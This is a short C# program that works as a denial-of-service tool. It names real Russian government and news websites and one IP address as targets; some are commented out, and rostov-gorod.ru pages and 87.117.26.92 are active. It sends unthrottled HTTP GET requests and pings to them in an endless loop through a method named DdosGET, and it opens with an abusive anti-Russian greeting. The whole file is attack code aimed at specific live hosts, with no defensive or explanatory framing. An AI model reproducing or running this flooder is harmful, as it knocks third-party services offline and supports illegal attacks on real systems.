using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;

namespace Program
{
    public class Program
    {
        private static HttpClient httpClient = new HttpClient();
        private static Stopwatch stopWatch = new Stopwatch();
        private static long requestCount = 0;

        public static async Task Main(string[] args)
        {
            Console.WriteLine("Hello RUSSIAN WARSHIP, GO F*CK YOURSELF!!");

            var targets = new List<string> {
                //"http://cbr.ru",
                //"http://www.interfax.ru",
                //"http://izvestia.ru",
                //"http://life.ru",
                //"http://www.vesti.ru",
                //"https://tass.ru",
                //"http://defence.council.gov.ru",
                //"https://rostov-gorod.ru",
                "https://rostov-gorod.ru/press_room",
                "https://rostov-gorod.ru/press_room/media",
                "87.117.26.92",
            };

            stopWatch.Start();

            while (true)
            {
                foreach (var site in targets)
                    _ = Task.WhenAny(DdosGET(site));
            }
        }

        async static Task DdosGET(string siteUrl)
        {
            try
            {
                if (IPAddress.TryParse(siteUrl, out var ipAddress))
                {
                    var response = await new Ping().SendPingAsync(ipAddress);

                    Console.WriteLine($"PING: Status:{(int)response.Status}({response.Status}) | IpAddress:{response.Address}");
                }
                else
                {
                    var response = await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Get, siteUrl));

                    if (response.StatusCode == HttpStatusCode.Moved && response.Headers?.Location?.AbsoluteUri != null)
                        response = await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Get, response.Headers.Location.AbsoluteUri));

                    Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");
                }

                ++requestCount;

                Console.WriteLine($"INFO: RequestCount:{requestCount} | ElapsedTime:{stopWatch.Elapsed}");
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}